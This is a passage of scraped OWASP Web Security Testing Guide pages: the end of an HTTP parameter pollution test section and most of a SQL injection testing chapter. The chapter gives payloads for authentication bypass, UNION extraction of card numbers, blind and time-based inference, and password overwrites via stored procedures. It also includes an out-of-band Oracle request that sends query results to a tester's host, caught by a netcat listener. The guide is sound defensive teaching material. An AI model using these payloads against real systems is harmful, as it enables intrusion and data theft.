both (`kittens,puppies` or `kittens~puppies` or `['kittens','puppies']`), may give an empty result, or error page.\n\nThis behavior, whether using the first, last, or combination of input parameters with the same name, is very likely to be consistent across the entire application. Whether or not this default behavior reveals a potential vulnerability depends on the specific input validation and filtering specific to a particular application. As a general rule: if existing input validation and other security mechanisms are sufficient on single inputs, and if the server assigns only the first or last polluted parameters, then parameter pollution does not reveal a vulnerability. If the duplicate parameters are concatenated, different web application components use different occurrences or testing generates an error, there is an increased likelihood of being able to use parameter pollution to trigger security vulnerabilities.\n\nA more in-depth analysis would require three HTTP requests for each HTTP parameter:\n\n1. Submit an HTTP request containing the standard parameter name and value, and record the HTTP response. E.g. `page?par1=val1`\n2. Replace the parameter value with a tampered value, submit and record the HTTP response. E.g. `page?par1=HPP_TEST1`\n3. Send a new request combining step (1) and (2). Again, save the HTTP response. E.g. `page?par1=val1&par1=HPP_TEST1`\n4. Compare the responses obtained during all previous steps. If the response from (3) is different from (1) and the response from (3) is also different from (2), there is an impedance mismatch that may be eventually abused to trigger HPP vulnerabilities.\n\nCrafting a full exploit from a parameter pollution weakness is beyond the scope of this text. See the references for examples and details.\n\n### Client-Side HPP\n\nSimilarly to server-side HPP, manual testing is the only reliable technique to audit web applications in order to detect parameter pollution vulnerabilities affecting client-side components. While in the server-side variant the attacker leverages a vulnerable web application to access protected data or to perform actions that are either not permitted or not supposed to be executed, client-side attacks aim at subverting client-side components and technologies.\n\nTo test for HPP client-side vulnerabilities, identify any form or action that allows user input and shows a result of that input back to the user. A search page is ideal, but a login box might not work (as it might not show an invalid username back to the user).\n\nSimilarly to server-side HPP, pollute each HTTP parameter with `%26HPP_TEST` and look for *url-decoded* occurrences of the user-supplied payload:\n\n- `&HPP_TEST`\n- `&amp;HPP_TEST`\n- etc.\n\nIn particular, pay attention to responses having HPP vectors within `data`, `src`, `href` attributes or forms actions. Again, whether or not this default behavior reveals a potential vulnerability depends on the specific input validation, filtering and application business logic. In addition, it is important to notice that this vulnerability can also affect query string parameters used in XMLHttpRequest (XHR), runtime attribute creation and other plugin technologies (e.g. Adobe Flash’s flashvars variables).\n\n## Tools\n\n- [ZAP Passive/Active Scanners](https://www.zaproxy.org)\n\n## References\n\n### Whitepapers\n\n- [HTTP Parameter Pollution - Luca Carettoni, Stefano di Paola](https://www.acunetix.com/websitesecurity/HTTP-Parameter-Pollution-WhitePaper.pdf)\n- [Client-side HTTP Parameter Pollution Example (Yahoo! Classic Mail flaw) - Stefano di Paola](https://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html)\n- [How to Detect HTTP Parameter Pollution Attacks - Chrysostomos Daniel](https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/)\n- [CAPEC-460: HTTP Parameter Pollution (HPP) - Evgeny Lebanidze](https://capec.mitre.org/data/definitions/460.html)\n- [Automated Discovery of Parameter Pollution Vulnerabilities in Web Applications - Marco Balduzzi, Carmen Torrano Gimenez, Davide Balzarotti, Engin Kirda](https://s3.eurecom.fr/docs/ndss11_hpp.pdf)\n", "timestamp": "2025-10-24T11:39:51.606486"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md", "content": "# Testing for SQL Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-05|\n\n## Summary\n\nSQL injection testing checks if it is possible to inject data into an application/site so that it executes a user-controlled SQL query in the database. Testers find a SQL injection vulnerability if the application uses user input to create SQL queries without proper input validation. Successful exploitation of this class of vulnerability allows an unauthorized user to access or manipulate data in the database, which if you didn't know already is quite bad.\n\nAn [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) attack consists of insertion or \"injection\" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input to affect the execution of predefined SQL commands.\n\nIn general, the way web applications construct SQL statements involving SQL syntax written by the programmers is mixed with user-supplied data. Example:\n\n`select title, text from news where id=$id`\n\nIn the example above the variable `$id` contains user-supplied data, while the remainder is the SQL static part supplied by the programmer; making the SQL statement dynamic.\n\nBecause of the way it was constructed, the user can supply crafted input trying to make the original SQL statement execute further actions of the user's choice. The example below illustrates the user-supplied data \"10 or 1=1\", changing the logic of the SQL statement, modifying the WHERE clause adding a condition \"or 1=1\".\n\n`select title, text from news where id=10 or 1=1`\n\n> **_NOTE:_**  Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.\n\nSQL Injection attacks can be divided into the following three classes:\n\n- Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward attack, in which the retrieved data is presented directly in the application web page.\n- Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).\n- Inferential or Blind: there is no actual transfer of data. Still, the tester can reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.\n\nA successful SQL Injection attack requires the attacker to craft a syntactically correct SQL Query. If the application returns an error message generated by an incorrect query, then it may be easier for an attacker to reconstruct the logic of the original query and, therefore, understand how to perform the injection correctly. However, if the application hides the error details, then the tester must be able to reverse engineer the logic of the original query.\n\nAbout the techniques to exploit SQL injection flaws, there are five common techniques. Also, those techniques sometimes can be used in a combined way (e.g. union operator and out-of-band):\n\n- Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.\n- Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.\n- Error-based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.\n- Out-of-band: the technique used to retrieve data using a different channel (e.g., make an HTTP connection to send the results to a web server).\n- Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when the attacker doesn’t have some answer (result, output, or error) from the application.\n\n## Test Objectives\n\n- Identify SQL injection points.\n- Assess the severity of the injection and the level of access that can be achieved through it.\n\n## How to Test\n\n### Detection Techniques\n\nThe first step in this test is to understand when the application interacts with a DB Server to access some data. Typical examples of cases, when an application needs to talk to a DB, include:\n\n- Authentication forms: when authentication is performed using a web form, chances are that the user credentials are checked against a database that contains all usernames and passwords (or, better, password hashes).\n- Search engines: the string submitted by the user could be used in an SQL query that extracts all relevant records from a database.\n- E-Commerce sites: the products and their characteristics (price, description, availability, etc) are very likely to be stored in a database.\n\nThe tester has to make a list of all input fields whose values could be used in crafting a SQL query, including the hidden fields of POST requests, and then test them separately, trying to interfere with the query and to generate an error. Consider also HTTP headers and Cookies.\n\nThe very first test usually consists of adding a single quote `'` or a semicolon `;` to the field or parameter under test. The first is used in SQL as a string terminator and, if not filtered by the application, would lead to an incorrect query. The second is used to end a SQL statement and, if it is not filtered, it is also likely to generate an error. The output of a vulnerable field might resemble the following (on a Microsoft SQL Server, in this case):\n\n```asp\nMicrosoft OLE DB Provider for ODBC Drivers error '80040e14'\n[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the\ncharacter string ''.\n/target/target.asp, line 113\n```\n\nAlso comment delimiters (`--` or `/* */`, etc) and other SQL keywords like `AND` and `OR` can be used to try to modify the query. A very simple but sometimes still effective technique is simply to insert a string where a number is expected, as an error like the following might be generated:\n\n```asp\nMicrosoft OLE DB Provider for ODBC Drivers error '80040e07'\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the\nvarchar value 'test' to a column of data type int.\n/target/target.asp, line 113\n```\n\nMonitor all the responses from the web server and have a look at the HTML/JavaScript source code. Sometimes the error is present inside them but for some reason (e.g. JavaScript error, HTML comments, etc) is not presented to the user. A full error message, like those in the examples, provides a wealth of information to the tester to mount a successful injection attack. However, applications often do not provide so much detail: a simple '500 Server Error' or a custom error page might be issued, meaning that we need to use blind injection techniques. In any case, it is very important to test each field separately: only one variable must vary while all the others remain constant, in order to precisely understand which parameters are vulnerable and which are not.\n\n### Standard SQL Injection Testing Methods\n\n#### Classic SQL Injection\n\nConsider the following SQL query:\n\n`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`\n\nA similar query is generally used from the web application to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to log-in to the system, otherwise access is denied. The values of the input fields are generally obtained from the user through a web form. Suppose we insert the following Username and Password values:\n\n`$username = 1' or '1' = '1`\n\n`$password = 1' or '1' = '1`\n\nThe query will be:\n\n`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`\n\n> **_NOTE:_**  Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.\n\nIf we suppose that the values of the parameters are sent to the server through the GET method, and if the domain of the vulnerable site is `www.example.com`, the request that we'll carry out will be:\n\n`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`\n\nAfter a short analysis, we notice that the query returns a value (or a set of values) because the condition is always true (`OR 1=1`). In this way, the system has authenticated the user without knowing the username and password.\n\n> Note: In some systems, the first row of a user table would be an administrator user. This may be the profile returned in some cases.\n\nAnother example query is the following:\n\n`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`\n\nIn this case, there are two problems, one due to the use of the parentheses and one due to the use of the MD5 hash function. First of all, we resolve the problem of the parentheses. That simply consists of adding some closing parentheses until we obtain a corrected query. To resolve the second problem, we try to evade the second condition. We add to our query a final symbol that means that a comment is beginning. In this way, everything that follows such a symbol is considered a comment. Every DBMS has its own syntax for comments, however, a common symbol for the greater majority of databases is `/*`. In Oracle, the symbol is `--`. This said the values that we'll use as Username and Password are:\n\n`$username = 1' or '1' = '1'))/*`\n\n`$password = foo`\n\nIn this way, we'll get the following query:\n\n`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`\n\n(Due to the inclusion of a comment delimiter in the `$username` value the password portion of the query will be ignored.)\n\nThe request URL will be:\n\n`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`\n\nThis may return some values. Sometimes, the authentication code verifies that the number of returned records/results is exactly equal to 1. In the previous examples, this situation would be difficult (in the database there is only one value per user). To get around this problem, it is enough to insert an SQL command that imposes a condition that the number of the returned results must be one (one record returned). To reach this goal, we use the operator `LIMIT <num>`, where `<num>` is the number of the results/records that we want to be returned. Concerning the previous example, the value of the fields Username and Password will be modified as follows:\n\n`$username = 1' or '1' = '1')) LIMIT 1/*`\n\n`$password = foo`\n\nIn this way, we create a request like the following:\n\n`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`\n\n#### SELECT Statement\n\nConsider the following SQL query:\n\n`SELECT * FROM products WHERE id_product=$id_product`\n\nConsider also the request to a script that executes the query above:\n\n`https://www.example.com/product.php?id=10`\n\nWhen the tester tries a valid value (e.g. 10 in this case), the application will return the description of a product. A good way to test if the application is vulnerable in this scenario is to play with logic, using the operators AND and OR.\n\nConsider the request:\n\n`https://www.example.com/product.php?id=10 AND 1=2`\n\n`SELECT * FROM products WHERE id_product=10 AND 1=2`\n\nIn this case, probably the application would return some message telling us there is no content available or a blank page. Then the tester can send a true statement and check if there is a valid result:\n\n`https://www.example.com/product.php?id=10 AND 1=1`\n\n#### Stacked Queries\n\nDepending on the API that the web application is using and the DBMS (e.g. PHP + PostgreSQL, ASP+SQL SERVER) it may be possible to execute multiple queries in one call.\n\nConsider the following SQL query:\n\n`SELECT * FROM products WHERE id_product=$id_product`\n\nA way to exploit the above scenario would be:\n\n`https://www.example.com/product.php?id=10; INSERT INTO users (…)`\n\nThis way is possible to execute many queries in a row and independent of the first query.\n\n### Fingerprinting the Database\n\nEven though the SQL language is a standard, every DBMS has its peculiarity and differs from each other in many aspects like special commands, and functions to retrieve data such as users' names and databases, features, comments lines, etc.\n\nWhen the testers move to a more advanced SQL injection exploitation they need to know what the backend database is.\n\n#### Errors Returned by the Application\n\nThe first way to find out what backend database is used is by observing the error returned by the application. The following are some examples of error messages:\n\nMySql:\n\n```html\nYou have an error in your SQL syntax; check the manual\nthat corresponds to your MySQL server version for the\nright syntax to use near '\\'' at line 1\n```\n\nOne complete UNION SELECT with version() can also help to know the backend database.\n\n`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`\n\nOracle:\n\n`ORA-00933: SQL command not properly ended`\n\nMS SQL Server:\n\n```html\nMicrosoft SQL Native Client error ‘80040e14’\nUnclosed quotation mark after the character string\n\nSELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1\n```\n\nPostgreSQL:\n\n```html\nQuery failed: ERROR: syntax error at or near\n\"’\" at character 56 in /www/site/test.php on line 121.\n```\n\nIf there is no error message or a custom error message, the tester can try to inject it into string fields using varying concatenation techniques:\n\n- MySql: ‘test’ + ‘ing’\n- SQL Server: ‘test’ ‘ing’\n- Oracle: ‘test’||’ing’\n- PostgreSQL: ‘test’||’ing’\n\n### Exploitation Techniques\n\n#### Union Exploitation Technique\n\nThe UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables. Suppose, for our example, that the query executed from the server is the following:\n\n`SELECT Name, Phone, Address FROM Users WHERE Id=$id`\n\nWe will set the following `$id` value:\n\n`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`\n\nWe will have the following query:\n\n`SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`\n\nWhich will join the result of the original query with all the credit card numbers in the CreditCardTable table. The keyword `ALL` is necessary to get around queries that use the keyword `DISTINCT`. Moreover, we notice that beyond the credit card numbers, we have selected two other values. These two values are necessary because the two queries must have an equal number of parameters/columns to avoid a syntax error.\n\nThe first detail a tester needs to find to exploit the SQL injection vulnerability using this technique is the right number of columns in the SELECT statement.\n\nTo achieve this, the tester can use the `ORDER BY` clause followed by a number indicating the numeration of the database’s column selected:\n\n`https://www.example.com/product.php?id=10 ORDER BY 10--`\n\nIf the query executes with success, the tester can assume in this example that there are 10 or more columns in the `SELECT` statement. If the query fails, then there must be fewer than 10 columns returned by the query. If there is an error message available, it would probably be:\n\n`Unknown column '10' in 'order clause'`\n\nAfter the tester finds out the number of columns, the next step is to find out the type of columns. Assuming there were 3 columns in the example above, the tester could try each column type, using the NULL value to help them:\n\n`https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`\n\nIf the query fails, the tester will probably see a message like:\n\n`All cells in a column must have the same datatype`\n\nIf the query executes with success, the first column can be an integer. Then the tester can move further and so on:\n\n`https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`\n\nAfter the successful information gathering, depending on the application, it may only show the tester the first result, because the application treats only the first line of the result set. In this case, it is possible to use a `LIMIT` clause or the tester can set an invalid value, making only the second query valid (supposing there is no entry in the database that has an ID that equals 99999):\n\n`https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`\n\n#### Hidden Union Exploitation Technique\n\nIt’s best when you can exploit a SQL injection with the [union technique](#union-exploitation-technique) because you can retrieve the result of your query in one request.  \nBut most of the SQL injections in the wild are blind. Yet, you can turn some of them into union-based injections.\n\n**Identification**  \nEither of the following methods can be used to identify these SQL injections:\n\n1. The vulnerable query returns data, but the injection is blind.\n2. The `ORDER BY` technique works, but you can't achieve a union-based injection.\n\n**Root Cause**  \nThe reason you can’t use the usual Union techniques is the complexity of the vulnerable query. In the Union Technique, you comment on the rest of the query after your `UNION` payload. It's fine for normal queries, but in more complicated queries it can be problematic. If the first part of the query depends on the second part of it, commenting on the rest of it breaks the original query.  \n\n**Scenario 1**  \nThe vulnerable query is a sub-query, and the parent query handles returning the data.\n\n```text\nSELECT \n  * \nFROM \n  customers \nWHERE \n  id IN (                 --\\\n    SELECT                   |\n      DISTINCT customer_id   |\n    FROM                     |\n      orders                 |--> vulnerable query\n    WHERE                    |\n      cost > 200             |\n  );                      --/\n```\n\n- _Problem:_ If you inject a `UNION` payload, it doesn't affect the returned data. Because you are modifying the `WHERE` section. In fact, you are not appending a `UNION` query to the original query.  \n- _Solution:_ You need to know the query which gets executed in the backend. Then, create your payload based on that. It means closing open parentheses or adding proper keywords if needed.\n\n**Scenario 2**  \nThe vulnerable query contains aliases or variable declarations.\n\n```text\nSELECT \n  s1.user_id, \n  (                                                                                      --\\\n    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> vulnerable query\n  ) AS overlap                                                                           --/\nFROM \n  subscriptions AS s1 \n  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id \n  AND s1.start_date <= s2.end_date \n  AND s1.end_date >= s2.start_date \nGROUP BY \n  s1.user_id\n```\n\n- _Problem:_ You break the query when you comment the rest of the original query after your injected payload because some aliases or variables become `undefined`.  \n- _Solution:_ You need to put appropriate keywords or aliases at the beginning of your payload. this way the first part of the original query stays valid.\n\n**Scenario 3**  \nThe result of the vulnerable query is being used in a second query. The second query returns the data, not the first one.\n\n```text\n<?php\n// retrieves product ID based on product name\n                            --\\\n$query1 = \"SELECT              |\n             id                |\n           FROM                |\n             products          |--> vulnerable query #1\n           WHERE               |\n             name = '$name'\";  |\n                            --/\n$result1 = odbc_exec($conn, $query1);\n// retrieves product's comments based on the product ID\n                              --\\\n$query2 = \"SELECT                |\n             comments            |\n           FROM                  |\n             products            |--> vulnerable query #2\n           WHERE                 |\n             id = '$result1'\";   |\n                              --/\n$result1 = odbc_exec($conn, $query2);\n?>\n```\n\n- _Problem:_ You can add a `UNION` payload to the first query but it won't affect the returned data.  \n- _solution:_ You need to inject in the second query. So the input to the second query should not get sanitized. Then, you need to make the first query return no data. Now append a `UNION` query that returns the payload you want to inject in the _second query_.\n  \n  **Example:**  \n  The base of the payload (what you inject in the first query):\n\n  ```text\n  ' AND 1 = 2 UNION SELECT \"PAYLOAD\" -- -\n  ```\n\n  The `PAYLOAD` is what you want to inject in the _second query_:\n  \n  ```text\n  ' AND 1=2 UNION SELECT ...\n  ```\n\n  The final payload (after replacing the `PAYLOAD`):\n\n  ```text\n  ' AND 1 = 2 UNION SELECT \"' AND 1=2 UNION SELECT ...\" -- -\n                            \\________________________/\n                                        ||\n                                        \\/\n                                 the payload that\n                                  get's injected\n                               into the second query\n  \\________________________________________________________/\n                              ||\n                              \\/\n   the actual query we inject into the vulnerable parameter\n  ```\n\n  The first query after injection:\n\n  ```text\n  SELECT               --\\\n    id                    |\n  FROM                    |----> first query\n    products              |\n  WHERE                   |\n    name = 'abcd'      --/\n    AND 1 = 2                                 --\\\n  UNION                                          |----> injected payload (what gets injected into the second payload)\n  SELECT                                         |\n    \"' AND 1=2 UNION SELECT ... -- -\" -- -'   --/\n  ```\n\n  The second query after injection:\n\n  ```text\n  SELECT            --\\\n    comments           |\n  FROM                 |----> second query\n    products           |\n  WHERE                |\n    id = ''         --/\n    AND 1 = 2         --\\ \n  UNION                  |----> injected payload (the final UNION query that controls the returned data)\n  SELECT ... -- -'    --/\n  ```\n\n**Scenario 4**  \nThe vulnerable parameter is being used in several independent queries.\n\n```text\n<?php\n//retrieving product details based on product ID\n$query1 = \"SELECT \n             name, \n             inserted, \n             size \n           FROM \n             products \n           WHERE \n             id = '$id'\";\n$result1 = odbc_exec($conn, $query1);\n//retrieving product comments based on the product ID\n$query2 = \"SELECT \n             comments \n           FROM \n             products \n           WHERE \n             id = '$id'\";\n$result2 = odbc_exec($conn, $query2);\n?>\n```\n\n- _Problem:_ Appending a `UNION` query to the first (or second) query doesn't break it, but it may break the other one.  \n- _Solution:_ It depends on the code structure of the application. But the first step is to know the original query. Most of the time, these injections are time-based. Also, the time-based payload gets injected in several queries which can be problematic.  \n  For example, if you use `SQLMap`, this situation confuses the tool and the output gets messed up. Because the delays will not be as expected.  \n\n**Extracting Original Query**  \nAs you see, knowing the original query is always needed to achieve a union-based injection.  \nYou can retrieve the original query using the default DBMS tables:\n\n| DBMS                 | Table                          |\n|----------------------|--------------------------------|\n| MySQL                | INFORMATION_SCHEMA.PROCESSLIST |\n| PostgreSQL           | pg_stat_activity               |\n| Microsoft SQL Server | sys.dm_exec_cached_plans       |\n| Oracle               | V$SQL                          |\n\n**Automation**  \nSteps to automate the workflow:\n\n1. Extract the original query using `SQLMap` and blind injection.\n2. Build a base payload according to the original query and achieve union-based injection.\n3. Automate the exploitation of the union-based injection by one of these options:  \n    - Specifying a _custom injection point marker_ (`*`)\n    - Using `--prefix` and `--suffix` flags.\n\n**Example:**  \nConsider the third scenario discussed above.  \nWe assume the DMBS is `MySQL` and the first and second queries return only one column.\nThis can be your payload for extracting the version of the database:\n\n```text\n' AND 1=2 UNION SELECT \" ' AND 1=2 UNION SELECT @@version -- -\" -- -\n```\n\nSo the target URL would be like this:\n\n```text\nhttps://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+\"+'AND 1=2+UNION+SELECT+@@version+--+-\"+--+-\n```\n\nAutomation:  \n\n- _custom injection point marker_ (`*`):\n\n  ```text\n  sqlmap -u \"https://example.org/search?query=abcd'AND 1=2 UNION SELECT \\\"*\\\"-- -\"\n  ```\n\n- `--prefix` and `--suffix` flags:\n\n  ```text\n  sqlmap -u \"https://example.org/search?query=abcd\" --prefix=\"'AND 1=2 UNION SELECT \\\"\" --suffix=\"\\\"-- -\"\n  ```\n\n#### Boolean Exploitation Technique\n\nThe Boolean exploitation technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything about the structure of the query or the database. (The page does not return a SQL error, it may just return an HTTP 500, 404, or redirect).\n\nBy using inference methods, it is possible to avoid this obstacle and thus succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers, and finally deducing the meaning of such answers. We consider, as always, the `www.example.com` domain and we suppose that it contains a parameter named `id` vulnerable to SQL injection. This means that when carrying out the following request:\n\n`https://www.example.com/index.php?id=1'`\n\nWe will get one page with a custom error message which is due to a syntactic error in the query. We suppose that the query executed on the server is:\n\n`SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`\n\nWhich is exploitable through the methods seen previously. What we want to obtain is the values of the username field. The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. This is possible through the use of some standard functions, present in practically every database. For our example, we will use the following pseudo-functions:\n\n- SUBSTRING (text, start, length): returns a substring starting from the position \"start\" of text and length \"length\". If \"start\" is greater than the length of text, the function returns a null value.\n\n- ASCII (char): it gives back the ASCII value of the input character. A null value is returned if char is 0.\n\n- LENGTH (text): it gives back the number of characters in the input text.\n\nThrough such functions, we will execute our tests on the first character and, when we have discovered the value, we will pass it to the second and so on, until we will have discovered the entire value. The tests will take advantage of the function SUBSTRING, to select only one character at a time (selecting a single character means imposing the length parameter to 1), and the function ASCII, to obtain the ASCII value, so that we can do numerical comparison. The results of the comparison will be done with all the values of the ASCII table until the right value is found. As an example, we will use the following value for `Id`:\n\n`$Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`\n\nThat creates the following query (from now on, we will call it \"inferential query\"):\n\n`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`\n\nThe previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. If we get a false value, then we increase the index of the ASCII table from 97 to 98 and we repeat the request. If instead we obtain a true value, we set the index of the ASCII table to zero and we analyze the next character, modifying the parameters of the SUBSTRING function. The problem is to understand in which way we can distinguish tests returning a true value from those that return false. To do this, we create a query that always returns false. This is possible by using the following value for `Id`:\n\n`$Id=1' AND '1' = '2`\n\nWhich will create the following query:\n\n`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`\n\nThe obtained response from the server (that is HTML code) will be the false value for our tests. This is enough to verify whether the value obtained from the execution of the inferential query is equal to the value obtained with the test executed before. Sometimes, this method does not work. If the server returns two different pages as a result of two identical consecutive web requests, we will not be able to discriminate the true value from the false value. In these particular cases, it is necessary to use particular filters that allow us to eliminate the code that changes between the two requests and obtain a template. Later on, for every inferential request executed, we will extract the relative template from the response using the same function, and we will perform a control between the two templates to decide the result of the test.\n\nIn the previous discussion, we haven't dealt with the problem of determining the termination condition for our tests, i.e. when we should end the inference procedure. A technique to do this uses one characteristic of the SUBSTRING function and the LENGTH function. When the test compares the current character with the ASCII code 0 (i.e. the value null) and the test returns the value true, then either we are done with the inference procedure (we have scanned the whole string), or the value we have analyzed contains the null character.\n\nWe will insert the following value for the field `Id`:\n\n`$Id=1' OR LENGTH(username)=N AND '1' = '1`\n\nWhere N is the number of characters that we have analyzed up to now (not counting the null value). The query will be:\n\n`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR LENGTH(username)=N AND '1' = '1'`\n\nThe query returns either true or false. If we obtain true, then we have completed the inference and, therefore, we know the value of the parameter. If we obtain false, this means that the null character is present in the value of the parameter, and we must continue to analyze the next parameter until we find another null value.\n\nThe blind SQL injection attack needs a high volume of queries. The tester may need an automatic tool to exploit the vulnerability.\n\n#### Error Based Exploitation Technique\n\nAn Error based exploitation technique is useful when the tester for some reason can’t exploit the SQL injection vulnerability using other techniques such as UNION. The Error-based technique consists of forcing the database to perform some operation in which the result will be an error. The point here is to try to extract some data from the database and show it in the error message. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).\n\nConsider the following SQL query:\n\n`SELECT * FROM products WHERE id_product=$id_product`\n\nConsider also the request to a script that executes the query above:\n\n`https://www.example.com/product.php?id=10`\n\nThe malicious request would be (e.g. Oracle 10g):\n\n`https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`\n\nIn this example, the tester is concatenating the value 10 with the result of the function `UTL_INADDR.GET_HOST_NAME`. This Oracle function will try to return the hostname of the parameter passed to it, which is another query, the name of the user. When the database looks for a hostname with the user database name, it will fail and return an error message like:\n\n`ORA-292257: host SCOTT unknown`\n\nThen the tester can manipulate the parameter passed to the GET_HOST_NAME() function and the result will be shown in the error message.\n\n#### Out-of-Band Exploitation Technique\n\nThis technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. The technique consists of the use of DBMS functions to perform an out-of-band connection and deliver the results of the injected query as part of the request to the tester’s server. Like the error-based techniques, each DBMS has its functions. Check for specific DBMS sections.\n\nConsider the following SQL query:\n\n`SELECT * FROM products WHERE id_product=$id_product`\n\nConsider also the request to a script that executes the query above:\n\n`https://www.example.com/product.php?id=10`\n\nThe malicious request would be:\n\n`https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`\n\nIn this example, the tester is concatenating the value 10 with the result of the function `UTL_HTTP.request`. This Oracle function will try to connect to `testerserver` and make an HTTP GET request containing the return from the query `SELECT user FROM DUAL`. The tester can set up a web server (e.g. Apache) or use the Netcat tool:\n\n```bash\n/home/tester/nc –nLp 80\n\nGET /SCOTT HTTP/1.1\nHost: testerserver.com\nConnection: close\n```\n\n#### Time Delay Exploitation Technique\n\nThe time delay exploitation technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. This technique consists of sending an injected query and in case the conditional is true, the tester can monitor the time taken for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).\n\nConsider the following SQL query:\n\n`SELECT * FROM products WHERE id_product=$id_product`\n\nConsider also the request to a script that executes the query above:\n\n`https://www.example.com/product.php?id=10`\n\nThe malicious request would be (e.g. MySql 5.x):\n\n`https://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`\n\nIn this example the tester is checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.\n\n#### Stored Procedure Injection\n\nWhen using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.\n\nConsider the following SQL Server Stored Procedure:\n\n```sql\nCreate procedure user_login @username varchar(20), @passwd varchar(20)\nAs\nDeclare @sqlstring varchar(250)\nSet @sqlstring  = ‘\nSelect 1 from users\nWhere username = ‘ + @username + ‘ and passwd = ‘ + @passwd\nexec(@sqlstring)\nGo\n```\n\nUser input:\n\n```sql\nanyusername or 1=1'\nanypassword\n```\n\nThis procedure does not sanitize the input, therefore allowing the return value to show an existing record with these parameters.\n\n> This example may seem unlikely due to the use of dynamic SQL to log in a user but consider a dynamic reporting query where the user selects the columns to view. The user could insert malicious code into this scenario and compromise the data.\n\nConsider the following SQL Server Stored Procedure:\n\n```sql\nCreate\nprocedure get_report @columnamelist varchar(7900)\nAs\nDeclare @sqlstring varchar(8000)\nSet @sqlstring  = ‘\nSelect ‘ + @columnamelist + ‘ from ReportTable‘\nexec(@sqlstring)\nGo\n```\n\nUser input:\n\n```sql\n1 from users; update users set password = 'password'; select *\n```\n\nThis will result in the report running and all users’ passwords being updated.\n\n#### Automated Exploitation\n\nMost of the situations and 